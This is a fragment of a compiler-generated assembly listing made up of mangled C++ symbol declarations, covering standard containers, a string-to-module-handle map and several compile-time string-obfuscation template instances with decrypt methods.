PUBLIC	??D?$_List_const_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@QEBAAEBU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@1@XZ ; std::_List_const_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >::operator*
PUBLIC	??0?$_List_const_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@QEAA@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@1@PEBV?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@1@@Z ; std::_List_const_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >::_List_const_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >
PUBLIC	??0?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@QEAA@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@1@PEBV?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@1@@Z ; std::_List_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >::_List_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >
PUBLIC	??0?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@QEAA@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@1@PEBV?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@1@@Z ; std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >
PUBLIC	?_Take_contents@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXAEAV12@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Take_contents
PUBLIC	??R<lambda_1>@?1??push_back@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXD@Z@QEBA@QEADQEBD_KD@Z ; `std::basic_string<char,std::char_traits<char>,std::allocator<char> >::push_back'::`2'::<lambda_1>::operator()
PUBLIC	?push_back@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::push_back
PUBLIC	?deallocate@?$allocator@PEBD@std@@QEAAXQEAPEBD_K@Z ; std::allocator<char const *>::deallocate
PUBLIC	??0?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@QEAA@XZ ; std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >
PUBLIC	??0?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@QEAA@XZ ; std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >
PUBLIC	?end@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA?AV?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@XZ ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::end
PUBLIC	?_Unchecked_begin@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA?AV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@XZ ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::_Unchecked_begin
PUBLIC	?_Unchecked_end@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA?AV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@XZ ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::_Unchecked_end
PUBLIC	?_Tidy@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@AEAAXXZ ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::_Tidy
PUBLIC	??0?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEAA@AEBV?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@1@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >
PUBLIC	?_Tidy@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAAXXZ ; std::_Hash_vec<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >::_Tidy
PUBLIC	??D?$_List_unchecked_const_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@U_Iterator_base0@2@@std@@QEBAAEBU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@1@XZ ; std::_List_unchecked_const_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >,std::_Iterator_base0>::operator*
PUBLIC	??E?$_List_unchecked_const_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@U_Iterator_base0@2@@std@@QEAAAEAV01@XZ ; std::_List_unchecked_const_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >,std::_Iterator_base0>::operator++
PUBLIC	??D?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@QEBAAEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@1@XZ ; std::_List_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >::operator*
PUBLIC	?data@?$obfuscator@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@QEBAPEBDXZ ; ay::obfuscator<12,-1449805614855655457,char>::data
PUBLIC	?decrypt@?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@QEAAXXZ ; ay::obfuscated_data<12,-1449805614855655457,char>::decrypt
PUBLIC	?data@?$obfuscator@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@QEBAPEBDXZ ; ay::obfuscator<25,8178357769676364775,char>::data
PUBLIC	?decrypt@?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@QEAAXXZ ; ay::obfuscated_data<25,8178357769676364775,char>::decrypt
PUBLIC	?data@?$obfuscator@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@QEBAPEBDXZ ; ay::obfuscator<16,-1909597575049685103,char>::data
PUBLIC	?decrypt@?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@QEAAXXZ ; ay::obfuscated_data<16,-1909597575049685103,char>::decrypt
PUBLIC	?data@?$obfuscator@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@QEBAPEBDXZ ; ay::obfuscator<15,2868625218150416285,char>::data
PUBLIC	?decrypt@?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@QEAAXXZ ; ay::obfuscated_data<15,2868625218150416285,char>::decrypt
PUBLIC	?data@?$obfuscator@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@QEBAPEBDXZ ; ay::obfuscator<31,-7365158476837733999,char>::data
PUBLIC	?decrypt@?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@QEAAXXZ ; ay::obfuscated_data<31,-7365158476837733999,char>::decrypt
PUBLIC	?data@?$obfuscator@$0BI@$0?ONOEALOLKHONGJN@D@ay@@QEBAPEBDXZ ; ay::obfuscator<24,-1071364949277595293,char>::data
PUBLIC	?decrypt@?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@QEAAXXZ ; ay::obfuscated_data<24,-1071364949277595293,char>::decrypt
PUBLIC	?data@?$obfuscator@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@QEBAPEBDXZ ; ay::obfuscator<13,9016711428731545553,char>::data
PUBLIC	?decrypt@?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@QEAAXXZ ; ay::obfuscated_data<13,9016711428731545553,char>::decrypt
PUBLIC	?data@?$obfuscator@$0P@$0BPDLBGPANDNDDDN@D@ay@@QEBAPEBDXZ ; ay::obfuscator<15,140651103900218173,char>::data
PUBLIC	?decrypt@?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@QEAAXXZ ; ay::obfuscated_data<15,140651103900218173,char>::decrypt
PUBLIC	?data@?$obfuscator@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@QEBAPEBDXZ ; ay::obfuscator<21,6311572415330896177,char>::data
PUBLIC	?decrypt@?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@QEAAXXZ ; ay::obfuscated_data<21,6311572415330896177,char>::decrypt
PUBLIC	?data@?$obfuscator@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@QEBAPEBDXZ ; ay::obfuscator<14,1978695492441415517,char>::data
PUBLIC	?decrypt@?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@QEAAXXZ ; ay::obfuscated_data<14,1978695492441415517,char>::decrypt
PUBLIC	?data@?$obfuscator@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@QEBAPEBDXZ ; ay::obfuscator<13,-4924288238255343789,char>::data
PUBLIC	?decrypt@?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@QEAAXXZ ; ay::obfuscated_data<13,-4924288238255343789,char>::decrypt
PUBLIC	?data@?$obfuscator@$0BI@$0?MCINOCCHMAEECDD@D@ay@@QEBAPEBDXZ ; ay::obfuscator<24,-876194367214469683,char>::data
PUBLIC	?decrypt@?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@QEAAXXZ ; ay::obfuscated_data<24,-876194367214469683,char>::decrypt
PUBLIC	?pointer_to@?$pointer_traits@PEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@SAPEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@2@AEAU32@@Z ; std::pointer_traits<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> *>::pointer_to
PUBLIC	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@$$QEAV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
PUBLIC	??Y?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV01@D@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator+=
PUBLIC	?_Unchecked_begin@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAPEADXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Unchecked_begin
PUBLIC	?_Unchecked_end@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAPEADXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Unchecked_end
PUBLIC	?find@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KAEBV12@_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::find
PUBLIC	?allocate@?$allocator@PEBD@std@@QEAAPEAPEBD_K@Z	; std::allocator<char const *>::allocate
PUBLIC	??1?$vector@PEBDV?$allocator@PEBD@std@@@std@@QEAA@XZ ; std::vector<char const *,std::allocator<char const *> >::~vector<char const *,std::allocator<char const *> >
PUBLIC	?_Tidy@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAXXZ ; std::vector<char const *,std::allocator<char const *> >::_Tidy
PUBLIC	?_Xlength@?$vector@PEBDV?$allocator@PEBD@std@@@std@@CAXXZ ; std::vector<char const *,std::allocator<char const *> >::_Xlength
PUBLIC	??1?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@XZ ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::~list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >
PUBLIC	?end@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA?AV?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@XZ ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::end
PUBLIC	?_Unchecked_begin@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA?AV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@XZ ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Unchecked_begin
PUBLIC	?_Unchecked_end@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA?AV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@XZ ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Unchecked_end
PUBLIC	?erase@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA_KAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::erase
PUBLIC	??1?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAA@XZ ; std::_Hash_vec<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >::~_Hash_vec<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >
PUBLIC	??0?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@XZ ; std::unordered_map<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::unordered_map<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >
PUBLIC	?at@?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAAAEAPEAUHINSTANCE__@@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z ; std::unordered_map<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::at
PUBLIC	??8?$_List_unchecked_const_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@U_Iterator_base0@2@@std@@QEBA_NAEBV01@@Z ; std::_List_unchecked_const_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >,std::_Iterator_base0>::operator==
PUBLIC	??8?$_List_const_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@QEBA_NAEBV01@@Z ; std::_List_const_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >::operator==
PUBLIC	??C?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@QEBAPEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@1@XZ ; std::_List_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >::operator->
PUBLIC	??0?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@QEAA@AEBV?$obfuscator@$0M@$0?BEBOLOIGHKNGJACB@D@1@@Z ; ay::obfuscated_data<12,-1449805614855655457,char>::obfuscated_data<12,-1449805614855655457,char>
PUBLIC	??1?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@QEAA@XZ ; ay::obfuscated_data<12,-1449805614855655457,char>::~obfuscated_data<12,-1449805614855655457,char>
PUBLIC	??B?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@QEAAPEADXZ ; ay::obfuscated_data<12,-1449805614855655457,char>::operator char *
